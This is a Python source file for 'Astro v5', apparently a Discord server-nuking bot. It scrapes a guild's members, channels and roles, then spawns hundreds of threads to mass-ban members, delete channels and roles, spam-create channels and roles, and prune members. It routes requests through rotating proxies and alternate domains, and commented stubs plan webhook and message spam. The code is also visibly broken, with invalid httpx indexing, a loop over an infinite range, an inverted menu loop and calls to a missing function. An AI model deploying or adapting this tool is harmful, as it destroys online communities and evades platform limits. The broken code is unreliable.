from cmath import inf
import json
import time, httpx, random, discord, threading, os
from discord.ext import commands

# custom imports
import util, strings, data as astro_data

intents = discord.Intents.all()
intents.members = True

client = commands.Bot(
    command_prefix="astro!", case_insensitive=False, bot=True, intents=intents
)

util.set_title("Astro v5 - Made by horrid")

amount = 0
msg_prefix = "astro@localhost - "
api_versions = ["9", "6"]
motds = ["That's one small step for man, one giant leap for mankind. - Armstrong"]
domains = [
    "discord.com",
    "discordapp.com",
    "canary.discord.com",
    "ptb.discord.com",
]


with open("proxies.txt") as proxies:
    proxies = proxies.readlines()


def msg(msg):
    util.out(f"{msg_prefix}{msg}", color=True)


def show_banner():
    util.clear_output()

    util.out(strings.banner, color=True)
    util.out(strings.feature_table, True, True)
    util.out(strings.motd_delims.replace("<X>", random.choice(motds)), True, True)


def get_random_endpoint(path):
    return (
        f"https://{random.choice(domains)}/api/v${random.choice(api_versions)}/{path}"
    )


def get_proxy():
    return {"HTTP": f"http://{random.choice(proxies)}"}


util.clear_output()

util.out(util.indent(strings.start_logo, 0.1), color=True)
util.out(util.indent(strings.credits, 0.2), color=True)

msg("Loaded settings!")
msg("Done, press any key to start.")

input()  # since this is synchronous, the script will stop until an input is received

guild_id = input(util.colorize("Enter guild ID: "))

show_banner()


class astro:
    settings = astro_data.astro_settings

    def request(method, url, body, proxy):
        return httpx[method](url, headers=astro_data.headers, data=body, proxies=proxy)

    def mass_ban():
        try:
            for member_id in open("scraped/scraped.txt"):
                response = astro.request(
                    "put",
                    get_random_endpoint(f"guilds/{guild_id}/bans/{member_id}"),
                    proxy=get_proxy(),
                )

                msg(
                    f"Banned member [{member_id}] - Status Code: {response.status_code} - Time: {time.ctime()}"
                )

                if response.text and json.load(response.text)["code"] == "30035":
                    msg(
                        "Maximum non-guilded ban members has been exceeded. You have to change the entire bot. (Exit by yourself)"
                    )
        except Exception as err:
            if err in (
                "_ssl.c:980: The handshake operation timed out",
                "[Errno 104] Connection reset by peer",
            ):
                msg("Timed out.")
            else:
                msg(
                    "Either handshake timed out or connection reset by peer, continuing ..."
                )

    def delete_channels():
        try:
            for channel_id in open("scraped/channels.txt"):
                response = astro.request(
                    "delete",
                    get_random_endpoint(f"guilds/{guild_id}/channels/{channel_id}"),
                    proxy=get_proxy(),
                )

                msg(
                    f"Deleted channel [{channel_id}] - Status Code: {response.status_code} - Time: {time.ctime()}"
                )
        except Exception as err:
            if err in (
                "_ssl.c:980: The handshake operation timed out",
                "[Errno 104] Connection reset by peer",
            ):
                msg("Timed out.")
            else:
                msg(
                    "Either handshake timed out or connection reset by peer, continuing ..."
                )

    def spam_channels():
        try:
            for i in range(0, inf):
                response = astro.request(
                    "delete",
                    get_random_endpoint(f"guilds/{guild_id}/channels"),
                    proxy=get_proxy(),
                )

                msg(
                    f"Created channel (total amount: {i}) - Status Code: {response.status_code} - Time: {time.ctime()}"
                )
        except Exception as err:
            if err in (
                "_ssl.c:980: The handshake operation timed out",
                "[Errno 104] Connection reset by peer",
            ):
                msg("Timed out.")
            else:
                msg(
                    "Either handshake timed out or connection reset by peer, continuing ..."
                )

    def spam_roles():
        try:
            for i in range(0, inf):
                response = astro.request(
                    "put",
                    get_random_endpoint(f"guilds/{guild_id}/roles"),
                    astro_data.role_body,
                    get_proxy(),
                )

                msg(
                    f"Created role (total amount: {i}) - Status Code: {response.status_code} - Time: {time.ctime()}"
                )
        except Exception as err:
            if err in (
                "_ssl.c:980: The handshake operation timed out",
                "[Errno 104] Connection reset by peer",
            ):
                msg("Timed out.")
            else:
                msg(
                    "Either handshake timed out or connection reset by peer, continuing ..."
                )

    # Coming soon....
    #    def whookmakesend():
    #        try:
    #            while True:
    #                req, url, headers = astro.q.get()
    #                p = open("proxies.txt", "r")
    #                pr = p.readlines()
    #                proxy = {"HTTP": f"http://{random.choice(pr)}"}
    #                s = req(url, headers=headers, json=astro.whookparam)
    #                astro.count += 1
    #                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} webhook made - status code: {s.status_code} - time: {time.ctime()}", 1))
    #        except Exception as err:
    #            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
    #                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
    #            else:
    #                print(err)
    #                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def delete_roles():
        try:
            for role_id in open("scraped/roles.txt"):
                response = astro.request(
                    "delete",
                    get_random_endpoint(f"guilds/{guild_id}/roles/{role_id}"),
                    proxy=get_proxy(),
                )

                msg(
                    f"Deleted role [{role_id}] - Status Code: {response.status_code} - Time: {time.ctime()}"
                )
        except Exception as err:
            if err in (
                "_ssl.c:980: The handshake operation timed out",
                "[Errno 104] Connection reset by peer",
            ):
                msg("Timed out.")
            else:
                msg(
                    "Either handshake timed out or connection reset by peer, continuing ..."
                )

    def prune_members():
        try:
            while True:
                response = astro.request(
                    "post",
                    get_random_endpoint(f"guilds/{guild_id}/prune"),
                    astro_data.prune_body,
                    get_proxy(),
                )

                msg(
                    f"Pruned Members - Status Code: {response.status_code} - Time: {time.ctime()}"
                )
        except Exception as err:
            if err in (
                "_ssl.c:980: The handshake operation timed out",
                "[Errno 104] Connection reset by peer",
            ):
                msg("Timed out.")
            else:
                msg(
                    "Either handshake timed out or connection reset by peer, continuing ..."
                )

    # Coming soon...
    #    def spamreqsend():
    #        try:
    #            while True:
    #                req, url, headers = astro.q.get()
    #                p = open("proxies.txt", "r")
    #                pr = p.readlines()
    #                proxy = {"HTTP": f"http://{random.choice(pr)}"}
    #                s = req(url, headers=headers, json=spamparam)
    #                astro.count += 1
    #                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} messages sent - status code: {s.status_code} - time: {time.ctime()}", 1))
    #                astro.q.task_done()
    #        except Exception as err:
    #            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
    #                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
    #            else:
    #                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    #    def makewhooks():
    #        for channel in open("scraped/channels.txt"):
    #            whookapi = f"https://discord.com/api/v9/channels/{channel}/webhooks"
    #            astro.q.put((httpx.post, whookapi, astro.headers))

    #    def spamworker():
    #        for channel in open("scraped/channels.txt"):
    #            for i in range(1000):
    #                ranspamapi = [f"https://discord.com/api/v9/channels/{channel}/messages", f"https://discordapp.com/api/api/v9/channels/{channel}/messages", f"https://canary.discord.com/api/v9/channels/{channel}/messages", f"https://ptb.discord.com/api/v9/channels/{channel}/messages"]
    #                astro.q.put((httpx.post, random.choice(ranspamapi), astro.headers))

    @client.event
    async def on_connect():
        try:
            guild = await client.fetch_guild(int(guild_id))
            id = client.get_guild(int(guild_id))
        except:
            msg("Guild ID is invalid. ")

            input()

            os._exit(0)

        show_banner()

        msg("Scraping...")

        members = await guild.chunk()

        msg("Done.")

        with open("scraped/channels.txt", "a") as channels_file:
            for channel in id.channels:
                channels_file.write(f"{channel.id}\n")

        with open("scraped/roles.txt", "a") as roles_file:
            for role in id.roles:
                roles_file.write(f"{role.id}\n")

        with open("scraped/scraped.txt", "a") as scraped_file:
            for member in members:
                scraped_file.write(str(member.id) + "\n")

        option = input(util.colorize(f"{msg_prefix}Choice: "))

        while not option:
            if option == "1":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1000):
                    threading.Thread(target=astro.massbanidsend, daemon=True).start()

            if option == "2":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1000):
                    threading.Thread(target=astro.mass_ban, daemon=True).start()

            if option == "3":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1000):
                    threading.Thread(target=astro.delete_channels, daemon=True).start()

            if option == "4":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1000):
                    threading.Thread(target=astro.spam_channels, daemon=True).start()

            if option == "5":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1000):
                    threading.Thread(target=astro.delete_roles, daemon=True).start()

            if option == "6":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1000):
                    threading.Thread(target=astro.spam_roles, daemon=True).start()

            if option == "7":
                util.clear_output()

                util.out(strings.start_logo, color=True)

                for x in range(1):
                    threading.Thread(target=astro.prune_members, daemon=True).start()

            # if option == "8":
            #     util.clear_output()

            #     util.out(strings.start_logo, color=True)

            #     for x in range(1000):
            #         threading.Thread(target=astro.whookmakesend, daemon=True).start()


if __name__ == "__main__":
    try:
        client.run(astro_data.token)
    except:
        msg("Token is invalid or ratelimited.")
        msg("Please make sure you have all intents enabled on your bot's token.")

        input()

        exit()
